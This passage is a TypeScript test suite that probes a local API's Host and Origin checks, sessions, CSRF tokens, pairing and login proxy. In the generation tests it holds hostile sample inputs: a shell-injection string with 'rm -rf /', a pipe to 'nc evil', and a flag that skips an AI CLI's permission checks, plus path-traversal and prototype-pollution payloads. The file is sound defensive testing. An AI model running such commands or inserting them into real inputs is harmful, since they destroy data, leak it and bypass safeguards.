import { afterEach, describe, expect, it } from 'vitest';
import { ApiError, Capabilities, JobAccepted, JobStatus } from '@tkb/contracts';
import { FakeRunner, type FakeFailureMode } from '@tkb/ai';
import { samplePlanBlueprint } from '@tkb/fixtures';
import { buildApp } from '../src/app.ts';
import { PairingStore } from '../src/auth/pairing.ts';
import { loadConfig, type PersonalConfig } from '../src/config.ts';
import { createSharedClient, type FetchLike } from '../src/shared-client/index.ts';

// Independent spec-side tests for A02 (K01/K02/K11/K21/K22/K23, personal-entry auth).
const PORT = 4311;
const HOST = `127.0.0.1:${PORT}`;
const ORIGIN = `http://127.0.0.1:${PORT}`;
const apps: ReturnType<typeof buildApp>[] = [];
afterEach(async () => {
  while (apps.length) await apps.pop()!.close();
});
const placeIds = samplePlanBlueprint.candidates.flatMap(c => c.activityOrder);
const constraints = { area: 'Kanazawa', startDate: '2026-11-01', endDate: '2026-11-02', timeZone: 'Asia/Tokyo', transportMode: 'transit' };

interface Call { url: string; init: RequestInit }
/** Fake shared login: userId is taken from loginId, so tests choose the identity. */
function sharedFetch(calls: Call[] = [], over: (loginId: string) => Response | Promise<Response> | undefined = () => undefined): FetchLike {
  return async (url, init) => {
    calls.push({ url, init });
    const loginId = JSON.parse(String(init.body)).loginId as string;
    const o = await over(loginId);
    if (o) return o;
    const h = new Headers({ 'content-type': 'application/json' });
    h.append('set-cookie', 'tkb_sid=UPSTREAMSECRET; HttpOnly; Path=/');
    return new Response(JSON.stringify({ userId: loginId, displayName: 'N', csrfToken: 'UPSTREAMCSRF' }), { status: 200, headers: h });
  };
}

function make(o: { failure?: FakeFailureMode; config?: Partial<PersonalConfig>; fetch?: FetchLike; env?: NodeJS.ProcessEnv; sharedClient?: ReturnType<typeof createSharedClient> } = {}) {
  const config = { ...loadConfig({ PERSONAL_ALLOWED_USER_IDS: 'u1, u2', ...o.env }), ...o.config };
  const pairing = new PairingStore({ ttlMs: config.pairingTtlMs });
  const app = buildApp({
    config, pairing, runner: new FakeRunner({ failure: o.failure }),
    fetch: o.fetch ?? sharedFetch(), sharedClient: o.sharedClient, allowedPlaceIds: placeIds,
  });
  apps.push(app);
  return { app, pairing };
}
type A = ReturnType<typeof make>;
const post = (a: A, url: string, payload: unknown, headers: Record<string, string> = {}) =>
  a.app.inject({ method: 'POST', url, payload: payload as object, headers: { host: HOST, origin: ORIGIN, ...headers } });
const get = (a: A, url: string, headers: Record<string, string> = {}) =>
  a.app.inject({ method: 'GET', url, headers: { host: HOST, ...headers } });

async function pair(a: A) {
  const r = await post(a, '/local/v1/pair', { code: a.pairing.issue() });
  expect(r.statusCode).toBe(200);
  const cookie = String(r.headers['set-cookie']).split(';')[0]!;
  const csrf = (r.json() as { csrfToken: string }).csrfToken;
  return { cookie, csrf, h: { cookie, 'x-csrf-token': csrf }, res: r };
}
async function login(a: A, loginId = 'u1') {
  const s = await pair(a);
  const l = await post(a, '/local/v1/auth/login', { loginId, password: 'pw' }, s.h);
  expect(l.statusCode).toBe(200);
  return s;
}
const gen = (a: A, h: Record<string, string>, key = 'key-12345678', body: unknown = { constraints }) =>
  post(a, '/local/v1/generations', body, { ...h, 'idempotency-key': key });
const apiErr = (r: { json(): unknown }) => ApiError.parse(r.json());
async function waitState(a: A, h: Record<string, string>, id: string, state: string) {
  for (let i = 0; i < 200; i++) {
    const j = JobStatus.parse((await get(a, `/local/v1/jobs/${id}`, h)).json());
    if (j.state === state) return j;
    await new Promise(r => setTimeout(r, 10));
  }
  throw new Error('timeout waiting for ' + state);
}
const noLeak = (body: string) => {
  expect(body).not.toMatch(/node_modules|\.ts:\d+|\bat \S+ \(|stderr|stack/i);
  expect(body).not.toContain('UPSTREAM');
};

describe('Host header variants', () => {
  const ok = [`LOCALHOST:${PORT}`, `Localhost:${PORT}`, `localhost:${PORT}`, `[::1]:${PORT}`];
  const bad = [
    `localhost.:${PORT}`, `127.0.0.1:${PORT}@evil.example`, `evil.example@127.0.0.1:${PORT}`, `127.0.0.1`, `localhost`, `[::1]`,
    `127.0.0.1:${PORT + 1}`, `127.0.0.1:${PORT}.evil.example`, `127.0.0.1.evil.example:${PORT}`, `0.0.0.0:${PORT}`,
    `[::ffff:127.0.0.1]:${PORT}`, `127.1:${PORT}`, `2130706433:${PORT}`, `127.0.0.1:${PORT}, evil.example`, `127.0.0.1:${PORT} `,
  ];
  for (const h of ok) it(`accepts Host ${h}`, async () => {
    const a = make();
    expect((await a.app.inject({ url: '/local/v1/health', headers: { host: h } })).statusCode).toBe(200);
  });
  for (const h of bad) it(`rejects Host ${JSON.stringify(h)}`, async () => {
    const a = make();
    const r = await a.app.inject({ url: '/local/v1/health', headers: { host: h } });
    expect(r.statusCode).toBe(403);
    expect(apiErr(r).code).toBe('FORBIDDEN');
  });
  it('rejects bad Host even for unknown routes and capabilities', async () => {
    const a = make();
    for (const url of ['/nope', '/local/v1/capabilities', '/local/v1/jobs/x']) {
      expect((await a.app.inject({ url, headers: { host: 'evil.example' } })).statusCode).toBe(403);
    }
  });
  it('follows the configured port', async () => {
    const a = make({ config: { port: 5555 } });
    expect((await a.app.inject({ url: '/local/v1/health', headers: { host: '127.0.0.1:5555' } })).statusCode).toBe(200);
    expect((await a.app.inject({ url: '/local/v1/health', headers: { host: HOST } })).statusCode).toBe(403);
  });
});

describe('Origin variants', () => {
  const bad = ['null', `${ORIGIN}/`, `http://127.0.0.1:${PORT + 1}`, `https://127.0.0.1:${PORT}`, `${ORIGIN}.evil.example`,
    `http://localhost.:${PORT}`, 'http://evil.example', '', `HTTP://127.0.0.1:${PORT}`, 'file://', 'chrome-extension://abc'];
  for (const o of bad) it(`rejects Origin ${JSON.stringify(o)} on GET and POST`, async () => {
    const a = make();
    const g = await a.app.inject({ url: '/local/v1/health', headers: { host: HOST, origin: o } });
    expect(g.statusCode).toBe(403);
    const p = await post(a, '/local/v1/pair', { code: a.pairing.issue() }, { origin: o });
    expect(p.statusCode).toBe(403);
  });
  it('accepts the dev origins and no Origin on GET', async () => {
    const a = make();
    for (const o of [ORIGIN, 'http://localhost:5173', 'http://127.0.0.1:5173']) {
      expect((await a.app.inject({ url: '/local/v1/health', headers: { host: HOST, origin: o } })).statusCode).toBe(200);
    }
    expect((await get(a, '/local/v1/health')).statusCode).toBe(200);
  });
  it('POST without Origin needs Sec-Fetch-Site=same-origin; same-site/none/garbage refused', async () => {
    const a = make();
    for (const site of [undefined, 'same-site', 'cross-site', 'none', 'garbage']) {
      const headers: Record<string, string> = { host: HOST };
      if (site) headers['sec-fetch-site'] = site;
      const r = await a.app.inject({ method: 'POST', url: '/local/v1/pair', payload: { code: a.pairing.issue() }, headers });
      expect(r.statusCode, String(site)).toBe(403);
    }
  });
  it('same-site Sec-Fetch-Site is refused even with an allowed Origin', async () => {
    const a = make();
    const r = await post(a, '/local/v1/pair', { code: a.pairing.issue() }, { 'sec-fetch-site': 'same-site' });
    expect(r.statusCode).toBe(403);
  });
});

describe('Cookie handling and session isolation', () => {
  it('cookie attributes: HttpOnly, SameSite=Strict, Path=/local, no Domain/Secure/Max-Age leak', async () => {
    const a = make();
    const s = await pair(a);
    const c = String(s.res.headers['set-cookie']);
    expect(c).toMatch(/^tkb_local_sid=[A-Za-z0-9_-]{20,};/);
    expect(c).toMatch(/;\s*HttpOnly/);
    expect(c).toMatch(/;\s*SameSite=Strict/);
    expect(c).toMatch(/;\s*Path=\/local(;|$)/);
    expect(c).not.toMatch(/Domain=/i);
    expect(Array.isArray(s.res.headers['set-cookie'])).toBe(false); // exactly one cookie
    expect(Object.keys(s.res.json() as object)).toEqual(['csrfToken']);
    expect(s.res.body).not.toContain(s.cookie.split('=')[1]!);
  });
  it('each pairing yields a distinct session id and csrf token', async () => {
    const a = make();
    const s1 = await pair(a);
    const s2 = await pair(a);
    expect(s1.cookie).not.toBe(s2.cookie);
    expect(s1.csrf).not.toBe(s2.csrf);
  });
  it('forged, empty, truncated and malformed Cookie headers are unauthenticated', async () => {
    const a = make();
    const s = await pair(a);
    const sid = s.cookie.split('=')[1]!;
    const cookies = ['tkb_local_sid=forged', 'tkb_local_sid=', 'tkb_local_sid', ';;;', '=x', `tkb_local_sid=${sid.slice(0, -1)}`,
      `tkb_local_sid=${sid}x`, `TKB_LOCAL_SID=${sid}`, `xtkb_local_sid=${sid}`, `tkb_local_sid=${sid.toUpperCase() === sid ? sid.toLowerCase() : sid.toUpperCase()}`];
    for (const c of cookies) {
      const g = await get(a, '/local/v1/jobs/00000000-0000-4000-8000-000000000000', { cookie: c });
      expect(g.statusCode, c).toBe(401);
      const p = await post(a, '/local/v1/auth/login', { loginId: 'u1', password: 'p' }, { cookie: c, 'x-csrf-token': s.csrf });
      expect(p.statusCode, c).toBe(401);
    }
  });
  it('valid cookie among several cookies works; first duplicate wins (injected later duplicate cannot hijack)', async () => {
    const a = make();
    const s = await pair(a);
    const r = await post(a, '/local/v1/auth/login', { loginId: 'u1', password: 'p' }, { cookie: `a=1; ${s.cookie}; b=2`, 'x-csrf-token': s.csrf });
    expect(r.statusCode).toBe(200);
    const dup = await post(a, '/local/v1/auth/login', { loginId: 'u1', password: 'p' }, { cookie: `tkb_local_sid=forged; ${s.cookie}`, 'x-csrf-token': s.csrf });
    expect(dup.statusCode).toBe(401);
  });
  it('a session cookie from a previous app instance (restart) is invalid in the new one', async () => {
    const a1 = make();
    const old = await login(a1);
    const a2 = make();
    const fresh = await pair(a2);
    expect((await get(a2, '/local/v1/jobs/00000000-0000-4000-8000-000000000000', { cookie: old.cookie })).statusCode).toBe(401);
    expect((await post(a2, '/local/v1/auth/login', { loginId: 'u1', password: 'p' }, old.h)).statusCode).toBe(401);
    // and the new session's own CSRF is not interchangeable with the old one
    expect((await post(a2, '/local/v1/auth/login', { loginId: 'u1', password: 'p' }, { cookie: fresh.cookie, 'x-csrf-token': old.csrf })).statusCode).toBe(403);
  });
  it('CSRF token of session A with cookie of session B is refused; GET needs session but not CSRF', async () => {
    const a = make();
    const sa = await login(a, 'u1');
    const sb = await login(a, 'u2');
    const r = await gen(a, { cookie: sb.cookie, 'x-csrf-token': sa.csrf });
    expect(r.statusCode).toBe(403);
    expect(apiErr(r).code).toBe('FORBIDDEN');
    const id = JobAccepted.parse((await gen(a, sa.h)).json()).jobId;
    expect((await get(a, `/local/v1/jobs/${id}`, { cookie: sa.cookie })).statusCode).toBe(200); // no CSRF header on GET
    expect((await get(a, `/local/v1/jobs/${id}`)).statusCode).toBe(401);
  });
  it('CSRF header variants refused: empty, prefix, suffix, array-like', async () => {
    const a = make();
    const s = await pair(a);
    for (const t of ['', s.csrf.slice(0, -1), s.csrf + 'x', ` ${s.csrf}`, s.csrf.toUpperCase() === s.csrf ? s.csrf.toLowerCase() : s.csrf.toUpperCase()]) {
      const r = await post(a, '/local/v1/auth/login', { loginId: 'u1', password: 'p' }, { cookie: s.cookie, 'x-csrf-token': t });
      expect(r.statusCode, JSON.stringify(t)).toBe(403);
    }
  });
});

describe('Pairing brute force and input shapes', () => {
  it('lowercase / padded / near-miss codes are rejected and not accepted as the real code', async () => {
    const a = make();
    const real = a.pairing.issue();
    for (const c of [real.toLowerCase(), ` ${real}`, `${real} `, real.slice(1)]) {
      const r = await post(a, '/local/v1/pair', { code: c });
      expect(r.statusCode, c).toBe(403);
      expect(r.headers['set-cookie']).toBeUndefined();
    }
    expect((await post(a, '/local/v1/pair', { code: real })).statusCode).toBe(200);
  });
  it('empty body, non-string code, extra keys, arrays, null, huge code => 422 and no cookie', async () => {
    const a = make();
    a.pairing.issue();
    const bodies: unknown[] = [undefined, {}, { code: 123 }, { code: null }, { code: ['A'] }, { code: { a: 1 } }, { code: '' },
      { code: 'A'.repeat(65) }, { code: 'A'.repeat(100_000) }, { code: 'AAAAAAAA', extra: 1 }, [], null, 'AAAAAAAA'];
    for (const b of bodies) {
      const r = await post(a, '/local/v1/pair', b);
      expect(r.statusCode, JSON.stringify(b)?.slice(0, 40)).toBe(422);
      expect(r.headers['set-cookie']).toBeUndefined();
    }
  });
  it('malformed JSON / prototype-pollution keys on pair are 422 and do not consume attempts', async () => {
    const a = make();
    const real = a.pairing.issue();
    const raw = (payload: string) => a.app.inject({ method: 'POST', url: '/local/v1/pair', payload, headers: { host: HOST, origin: ORIGIN, 'content-type': 'application/json' } });
    expect((await raw('{"code":')).statusCode).toBe(422);
    expect((await raw('{"__proto__":{"code":"X"},"code":"AAAA"}')).statusCode).not.toBe(200);
    expect((await raw('{"code":"AAAA","__proto__":{"x":1}}')).statusCode).not.toBe(200);
    // ({}) as Object.prototype must not have been polluted
    expect(({} as Record<string, unknown>).code).toBeUndefined();
    expect((await post(a, '/local/v1/pair', { code: real })).statusCode).toBe(200);
  });
  it('without issue() any code is refused (429) and never yields a cookie', async () => {
    const a = make();
    const r = await post(a, '/local/v1/pair', { code: 'AAAAAAAA' });
    expect(r.statusCode).toBe(429);
    expect(r.headers['set-cookie']).toBeUndefined();
  });
  it('concurrent attempts with the right code: exactly one session is created', async () => {
    const a = make();
    const code = a.pairing.issue();
    const rs = await Promise.all(Array.from({ length: 8 }, () => post(a, '/local/v1/pair', { code })));
    expect(rs.filter(r => r.statusCode === 200)).toHaveLength(1);
    expect(rs.filter(r => r.headers['set-cookie'])).toHaveLength(1);
    for (const r of rs.filter(r => r.statusCode !== 200)) expect([403, 429]).toContain(r.statusCode);
  });
  it('re-issuing a code invalidates the previous one and resets attempts', async () => {
    const a = make();
    const c1 = a.pairing.issue();
    const c2 = a.pairing.issue();
    expect((await post(a, '/local/v1/pair', { code: c1 })).statusCode).toBe(403);
    expect((await post(a, '/local/v1/pair', { code: c2 })).statusCode).toBe(200);
  });
  it('pairing code is never exposed on any GET endpoint', async () => {
    const a = make();
    const code = a.pairing.issue();
    for (const u of ['/local/v1/health', '/local/v1/capabilities', '/local/v1/pair', '/local/v1/']) {
      const r = await get(a, u);
      expect(r.body + JSON.stringify(r.headers)).not.toContain(code);
    }
  });
});

describe('login proxy (K11)', () => {
  const lp = (a: A, h: Record<string, string>, body: unknown = { loginId: 'u1', password: 'pw' }, extra: Record<string, string> = {}) =>
    post(a, '/local/v1/auth/login', body, { ...h, ...extra });

  it('upstream URL is exactly `${sharedBaseUrl}/api/v1/auth/login`; only content-type forwarded; credentials-only body', async () => {
    for (const base of ['http://127.0.0.1:4310', 'http://127.0.0.1:4310/', 'https://shared.example:8443///']) {
      const calls: Call[] = [];
      const a = make({ fetch: sharedFetch(calls), env: { SHARED_BASE_URL: base } });
      const s = await pair(a);
      const r = await lp(a, s.h, { loginId: 'u1', password: 'pw' }, {
        authorization: 'Bearer SECRET', 'x-forwarded-for': '9.9.9.9', 'x-csrf-token': s.csrf, referer: 'http://evil', 'proxy-authorization': 'x',
      });
      expect(r.statusCode).toBe(200);
      expect(calls).toHaveLength(1);
      expect(calls[0]!.url).toBe(`${base.replace(/\/+$/, '')}/api/v1/auth/login`);
      expect(calls[0]!.init.method).toBe('POST');
      expect(calls[0]!.init.redirect).toBe('manual');
      expect(calls[0]!.init.headers).toEqual({ 'content-type': 'application/json' });
      expect(JSON.parse(String(calls[0]!.init.body))).toEqual({ loginId: 'u1', password: 'pw' });
      expect(JSON.stringify(calls[0]!.init)).not.toContain(s.cookie.split('=')[1]!);
      expect(JSON.stringify(calls[0]!.init)).not.toContain('SECRET');
      expect(JSON.stringify(calls[0]!.init)).not.toContain(s.csrf);
    }
  });
  it('query string / path tricks on the local login route never alter the upstream URL', async () => {
    const calls: Call[] = [];
    const a = make({ fetch: sharedFetch(calls) });
    const s = await pair(a);
    await lp(a, s.h).then(r => expect(r.statusCode).toBe(200));
    const r = await post(a, '/local/v1/auth/login?url=http://evil/x&path=/api/v1/trips', { loginId: 'u1', password: 'pw' }, s.h);
    expect(r.statusCode).toBeLessThan(500);
    for (const c of calls) expect(c.url).toBe('http://127.0.0.1:4310/api/v1/auth/login');
  });
  it('response never contains upstream cookie, csrf, or Set-Cookie beyond none', async () => {
    const a = make();
    const s = await pair(a);
    const r = await lp(a, s.h);
    expect(r.json()).toEqual({ userId: 'u1', displayName: 'N' });
    expect(r.headers['set-cookie']).toBeUndefined();
    expect(r.body + JSON.stringify(r.headers)).not.toMatch(/UPSTREAM|tkb_sid/);
  });
  it('upstream 200 with malformed JSON / schema mismatch / missing Set-Cookie => UNAVAILABLE, no session login', async () => {
    const variants: Array<() => Response> = [
      () => new Response('{not json', { status: 200, headers: { 'set-cookie': 'tkb_sid=X; Path=/' } }),
      () => new Response('', { status: 200, headers: { 'set-cookie': 'tkb_sid=X; Path=/' } }),
      () => new Response('[]', { status: 200, headers: { 'set-cookie': 'tkb_sid=X; Path=/' } }),
      () => new Response(JSON.stringify({ userId: 'u1' }), { status: 200, headers: { 'set-cookie': 'tkb_sid=X; Path=/' } }),
      () => new Response(JSON.stringify({ userId: 'u1', displayName: 'N', csrfToken: 'C' }), { status: 200 }), // no Set-Cookie
    ];
    for (const v of variants) {
      const a = make({ fetch: sharedFetch([], () => v()) });
      const s = await pair(a);
      const r = await lp(a, s.h);
      expect(r.statusCode).toBe(503);
      expect(apiErr(r).code).toBe('UNAVAILABLE');
      noLeak(r.body);
      expect((await gen(a, s.h)).statusCode).toBe(401); // not logged in
    }
  });
  it('upstream redirects (301/302/307/308) are not followed and map to UNAVAILABLE', async () => {
    for (const st of [301, 302, 307, 308]) {
      const calls: Call[] = [];
      const a = make({ fetch: sharedFetch(calls, () => new Response(null, { status: st, headers: { location: 'http://evil.example/steal' } })) });
      const s = await pair(a);
      const r = await lp(a, s.h);
      expect(apiErr(r).code, String(st)).toBe('UNAVAILABLE');
      expect(r.body).not.toContain('evil.example');
      expect(calls).toHaveLength(1);
    }
  });
  it('userId case differing from allowlist is NOT allowed', async () => {
    const a = make({ fetch: sharedFetch([], () => undefined) });
    const s = await pair(a);
    const r = await lp(a, s.h, { loginId: 'U1', password: 'pw' });
    expect(r.statusCode).toBe(403);
    expect((await gen(a, s.h)).statusCode).toBe(401);
  });
  it('an allowed login followed by a denied login on the same session drops the earlier upstream identity', async () => {
    const a = make();
    const s = await login(a, 'u1');
    expect((await lp(a, s.h, { loginId: 'stranger', password: 'pw' })).statusCode).toBe(403);
    expect((await gen(a, s.h)).statusCode).toBe(401);
  });
  it('slow upstream: honors timeout and returns UNAVAILABLE instead of hanging', async () => {
    const slow: FetchLike = (_u, init) =>
      new Promise((_res, rej) => init.signal?.addEventListener('abort', () => rej(new DOMException('aborted', 'TimeoutError'))));
    const sc = createSharedClient({ baseUrl: 'http://127.0.0.1:4310', fetch: slow, timeoutMs: 50 });
    const a = make({ sharedClient: sc });
    const s = await pair(a);
    const t0 = Date.now();
    const r = await lp(a, s.h);
    expect(Date.now() - t0).toBeLessThan(2000);
    expect(r.statusCode).toBe(503);
    expect(apiErr(r).code).toBe('UNAVAILABLE');
    expect(apiErr(r).retryable).toBe(true);
  });
  it('the default shared client passes an abort signal (timeout is enforceable)', async () => {
    const calls: Call[] = [];
    const a = make({ fetch: sharedFetch(calls) });
    const s = await pair(a);
    await lp(a, s.h);
    expect(calls[0]!.init.signal).toBeInstanceOf(AbortSignal);
  });
  it('credential validation: missing/ wrong-typed fields, huge fields => 422 and upstream not called', async () => {
    const calls: Call[] = [];
    const a = make({ fetch: sharedFetch(calls) });
    const s = await pair(a);
    for (const b of [{}, { loginId: 'a' }, { password: 'b' }, { loginId: 1, password: 'b' }, { loginId: 'a', password: null }, { loginId: 'a', password: 'b', role: 'admin' }, [], null]) {
      const r = await lp(a, s.h, b);
      expect(r.statusCode, JSON.stringify(b)).toBe(422);
    }
    expect(calls).toHaveLength(0);
  });
  it('error responses never echo the submitted password', async () => {
    const a = make({ fetch: sharedFetch([], () => new Response('{}', { status: 401 })) });
    const s = await pair(a);
    const r = await lp(a, s.h, { loginId: 'u1', password: 'hunter2-SECRET' });
    expect(r.statusCode).toBe(401);
    expect(r.body + JSON.stringify(r.headers)).not.toContain('hunter2');
  });
  it('other HTTP methods/paths under /local/v1/auth and /local/v1/proxy do not exist', async () => {
    const a = make();
    const s = await login(a);
    for (const [m, u] of [['GET', '/local/v1/auth/login'], ['PUT', '/local/v1/auth/login'], ['DELETE', '/local/v1/auth/login'],
      ['POST', '/local/v1/auth/logout'], ['POST', '/api/v1/trips'], ['POST', '/local/v1/trips'], ['GET', '/local/v1/proxy/api/v1/trips']] as const) {
      const r = await a.app.inject({ method: m, url: u, headers: { host: HOST, origin: ORIGIN, ...s.h } });
      expect([404, 405], `${m} ${u}`).toContain(r.statusCode);
      expect(apiErr(r).code).toBe('NOT_FOUND');
    }
  });
});

describe('generation (K01/K02/K21)', () => {
  it('Idempotency-Key missing / invalid => 422', async () => {
    const a = make({ failure: 'timeout', config: { aiTimeoutMs: 60_000 } });
    const s = await login(a);
    expect((await post(a, '/local/v1/generations', { constraints }, s.h)).statusCode).toBe(422);
    for (const k of ['', 'short', 'a'.repeat(7), 'a'.repeat(129), 'has space 123', 'semi;colon123', 'uniécode123', 'quote"12345678', '../../etc/passwd']) {
      const r = await gen(a, s.h, k);
      expect(r.statusCode, k).toBe(422);
      expect(apiErr(r).code).toBe('VALIDATION_FAILED');
    }
    expect((await gen(a, s.h, 'a'.repeat(128))).statusCode).toBe(202);
    expect((await gen(a, s.h, 'a'.repeat(8) )).statusCode).toBe(202);
  });
  it('shell-injection payloads stay data: accepted or rejected, never executed, never echoed in errors', async () => {
    const a = make({ failure: 'timeout', config: { aiTimeoutMs: 60_000 } });
    const s = await login(a);
    const evil = '$(touch /tmp/pwn); `id`; rm -rf / | nc evil 1 && \n --dangerously-skip-permissions';
    const r = await gen(a, s.h, 'key-12345678', { constraints: { ...constraints, area: evil } });
    expect([202, 422]).toContain(r.statusCode);
    const bad = await gen(a, s.h, 'key-injection1', { constraints, cliArgs: ['--dangerously-skip-permissions'] });
    expect(bad.statusCode).toBe(422);
    expect(bad.body).not.toContain('dangerously');
    const bad2 = await gen(a, s.h, 'key-injection2', { constraints: { ...constraints, model: 'x; id' } });
    expect(bad2.body).not.toContain('x; id');
  });
  it('body too large and prototype-pollution keys are rejected as 4xx ApiError', async () => {
    const a = make();
    const s = await login(a);
    const raw = (payload: string, key: string) => a.app.inject({
      method: 'POST', url: '/local/v1/generations', payload,
      headers: { host: HOST, origin: ORIGIN, ...s.h, 'content-type': 'application/json', 'idempotency-key': key },
    });
    const big = await raw(JSON.stringify({ constraints: { ...constraints, area: 'x'.repeat(2_000_000) } }), 'key-bigbody1');
    expect(big.statusCode).toBeGreaterThanOrEqual(400);
    expect(big.statusCode).toBeLessThan(500);
    expect(ApiError.parse(big.json()).requestId).toBeTruthy();
    for (const p of [`{"__proto__":{"ownerId":"u2"},"constraints":${JSON.stringify(constraints)}}`,
      `{"constraints":${JSON.stringify(constraints)},"constructor":{"prototype":{"x":1}}}`,
      `{"constraints":{"__proto__":{"a":1},"area":"x"}}`]) {
      const r = await raw(p, 'key-proto0001');
      expect(r.statusCode).toBe(422);
      expect(apiErr(r).code).toBe('VALIDATION_FAILED');
    }
    expect(({} as Record<string, unknown>).ownerId).toBeUndefined();
  });
  it('malformed JSON variants => 422 ApiError without parser detail', async () => {
    const a = make();
    const s = await login(a);
    for (const p of ['{', '}', '{"constraints":', 'null', '[]', '"x"', '{"a":1}{"b":2}', '\u0000']) {
      const r = await a.app.inject({ method: 'POST', url: '/local/v1/generations', payload: p,
        headers: { host: HOST, origin: ORIGIN, ...s.h, 'content-type': 'application/json', 'idempotency-key': 'key-12345678' } });
      expect(r.statusCode, p).toBe(422);
      expect(apiErr(r).code).toBe('VALIDATION_FAILED');
      expect(r.body).not.toMatch(/Unexpected|position|JSON/);
    }
  });
  it('non-JSON content types are not accepted as a body', async () => {
    const a = make();
    const s = await login(a);
    const r = await a.app.inject({ method: 'POST', url: '/local/v1/generations', payload: 'constraints=1',
      headers: { host: HOST, origin: ORIGIN, ...s.h, 'content-type': 'application/x-www-form-urlencoded', 'idempotency-key': 'key-12345678' } });
    expect(r.statusCode).toBeGreaterThanOrEqual(400);
    expect(r.statusCode).toBeLessThan(500);
  });
  it('mode=replan without baseTripId (or without expectedRevision) => 422', async () => {
    const a = make();
    const s = await login(a);
    expect((await gen(a, s.h, 'key-replan001', { mode: 'replan', constraints })).statusCode).toBe(422);
    expect((await gen(a, s.h, 'key-replan002', { mode: 'replan', constraints, baseTripId: '11111111-1111-4111-8111-111111111111' })).statusCode).toBe(422);
    expect((await gen(a, s.h, 'key-replan003', { mode: 'bogus', constraints })).statusCode).toBe(422);
  });
  it('another owner cannot read/cancel; response is indistinguishable from an unknown id', async () => {
    const a = make({ failure: 'timeout', config: { aiTimeoutMs: 60_000 } });
    const s1 = await login(a, 'u1');
    const s2 = await login(a, 'u2');
    const id = JobAccepted.parse((await gen(a, s1.h)).json()).jobId;
    const unknown = '00000000-0000-4000-8000-000000000000';
    const strip = (r: { json(): unknown }) => { const { requestId: _r, ...rest } = apiErr(r); return rest; };
    const other = await get(a, `/local/v1/jobs/${id}`, { cookie: s2.cookie });
    const none = await get(a, `/local/v1/jobs/${unknown}`, { cookie: s2.cookie });
    expect(other.statusCode).toBe(404);
    expect(none.statusCode).toBe(404);
    expect(strip(other)).toEqual(strip(none));
    const oc = await post(a, `/local/v1/jobs/${id}/cancel`, undefined, s2.h);
    const nc = await post(a, `/local/v1/jobs/${unknown}/cancel`, undefined, s2.h);
    expect(oc.statusCode).toBe(404);
    expect(strip(oc)).toEqual(strip(nc));
    // the owner's job is untouched
    expect(JobStatus.parse((await get(a, `/local/v1/jobs/${id}`, { cookie: s1.cookie })).json()).state).not.toBe('cancelled');
    // non-uuid ids look the same
    const odd = await get(a, '/local/v1/jobs/not-an-id', { cookie: s2.cookie });
    expect(odd.statusCode).toBe(404);
    expect(strip(odd)).toEqual(strip(none));
  });
  it('two sessions of the SAME user share jobs; different users with same Idempotency-Key are independent', async () => {
    const a = make({ failure: 'timeout', config: { aiTimeoutMs: 60_000 } });
    const s1 = await login(a, 'u1');
    const s1b = await login(a, 'u1');
    const s2 = await login(a, 'u2');
    const id1 = JobAccepted.parse((await gen(a, s1.h, 'shared-key-1')).json()).jobId;
    const id1b = JobAccepted.parse((await gen(a, s1b.h, 'shared-key-1')).json()).jobId;
    const id2 = JobAccepted.parse((await gen(a, s2.h, 'shared-key-1')).json()).jobId;
    expect(id1b).toBe(id1);
    expect(id2).not.toBe(id1);
    // different-owner reuse with a different body is NOT a conflict (key space is per owner)
    const r = await gen(a, s2.h, 'shared-key-1', { constraints: { ...constraints, area: 'Other' } });
    expect(r.statusCode).toBe(409); // same owner, same key, different body
    const r3 = await gen(a, s1.h, 'shared-key-2', { constraints: { ...constraints, area: 'Other' } });
    expect(r3.statusCode).toBe(202);
  });
  it('unauthenticated (no upstream login) cannot reach jobs/generations/cancel', async () => {
    const a = make();
    const s = await pair(a);
    expect((await gen(a, s.h)).statusCode).toBe(401);
    expect((await get(a, '/local/v1/jobs/00000000-0000-4000-8000-000000000000', { cookie: s.cookie })).statusCode).toBe(401);
    expect((await post(a, '/local/v1/jobs/00000000-0000-4000-8000-000000000000/cancel', undefined, s.h)).statusCode).toBe(401);
  });
  it('queue full: with limit 1 and a stuck runner, the surplus request is QUEUE_FULL 429 retryable', async () => {
    const a = make({ failure: 'timeout', config: { aiQueueLimit: 1, aiTimeoutMs: 60_000 } });
    const s = await login(a);
    const codes: number[] = [];
    for (let i = 0; i < 4; i++) codes.push((await gen(a, s.h, `key-queue-0${i}`)).statusCode);
    expect(codes.slice(0, 2)).toEqual([202, 202]);
    const full = await gen(a, s.h, 'key-queue-99');
    expect(full.statusCode).toBe(429);
    expect(apiErr(full).code).toBe('QUEUE_FULL');
    expect(apiErr(full).retryable).toBe(true);
    // a retried identical request that was already accepted is still idempotent, not full
    expect((await gen(a, s.h, 'key-queue-00')).statusCode).toBe(202);
  });
  it('timeout via fake runner => CLI_TIMEOUT within a small injected timeout, then the queue drains', async () => {
    const a = make({ failure: 'timeout', config: { aiTimeoutMs: 40 } });
    const s = await login(a);
    const t0 = Date.now();
    const id = JobAccepted.parse((await gen(a, s.h)).json()).jobId;
    const j = await waitState(a, s.h, id, 'failed');
    expect(Date.now() - t0).toBeLessThan(3000);
    expect(j.error?.code).toBe('CLI_TIMEOUT');
    expect(j.error?.retryable).toBe(true);
    noLeak(JSON.stringify(j));
    const id2 = JobAccepted.parse((await gen(a, s.h, 'key-second-01')).json()).jobId;
    expect((await waitState(a, s.h, id2, 'failed')).error?.code).toBe('CLI_TIMEOUT');
  });
  it('every failure mode yields a schema-valid JobStatus with a SafeError and no raw output', async () => {
    const modes: Array<[FakeFailureMode | undefined, string[]]> = [
      ['invalid_json', ['INVALID_OUTPUT']], ['exit_nonzero', ['CLI_EXIT']], ['no_structured_output', ['INVALID_OUTPUT', 'CLI_EXIT']], [undefined, ['UNAVAILABLE']],
    ];
    for (const [m, codes] of modes) {
      const a = make({ failure: m, config: { aiTimeoutMs: 5000 } });
      const s = await login(a);
      const id = JobAccepted.parse((await gen(a, s.h)).json()).jobId;
      const j = await waitState(a, s.h, id, 'failed');
      expect(codes, String(m)).toContain(j.error?.code);
      expect(j.batchId).toBeNull();
      expect(j.state).not.toBe('succeeded');
      noLeak(JSON.stringify(j));
    }
  });
  it('cancel: queued job, finished job (idempotent, state unchanged), repeated cancel', async () => {
    const a = make({ failure: 'invalid_json' });
    const s = await login(a);
    const id = JobAccepted.parse((await gen(a, s.h)).json()).jobId;
    const done = await waitState(a, s.h, id, 'failed');
    const c1 = await post(a, `/local/v1/jobs/${id}/cancel`, undefined, s.h);
    expect(c1.statusCode).toBe(200);
    expect((c1.json() as { state: string }).state).toBe('failed');
    expect(JobStatus.parse((await get(a, `/local/v1/jobs/${id}`, { cookie: s.cookie })).json())).toEqual(done);

